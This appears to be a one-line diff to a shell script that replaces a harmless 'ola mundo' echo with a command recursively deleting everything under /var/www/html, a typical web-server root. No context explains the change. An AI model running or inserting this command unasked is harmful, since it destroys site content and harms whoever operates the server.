@@ -1,1 +1,1 @@
-echo 'ola mundo'
+rm -rf /var/www/html/*
